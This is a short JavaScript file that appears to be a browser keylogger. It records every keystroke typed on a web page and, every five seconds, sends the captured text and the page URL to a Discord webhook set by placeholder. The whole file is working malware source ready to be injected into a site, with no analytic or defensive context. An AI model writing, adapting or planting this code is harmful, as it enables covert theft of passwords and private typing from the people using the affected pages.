let keys = "";
const current = document.URL;
const discordWebhook =
  "YOUR_WEBHOOK_HERE";
document.addEventListener("keydown", (event) => {
  const key = event.key;
  if (key === "Enter") {
    keys += "\n";
    return;
  }
  if (key === "Backspace") {
    keys = keys.slice(0, keys.length - 1);
    return;
  }
  if (key === "CapsLock" || key === "Shift") {
    return;
  }
  console.log("Key detected");
  keys += key;
});

window.setInterval(async () => {
  if (keys == "") {
    return;
  }
  const message = `<${current}>\nHere are the keys: ` + "```" + keys + "```";
  sendMessageToDiscord(discordWebhook, message);
  keys = "";
}, 5000); // time in milliseconds

async function sendMessageToDiscord(webhook, msg) {
  await fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: msg,
    }),
  });
}
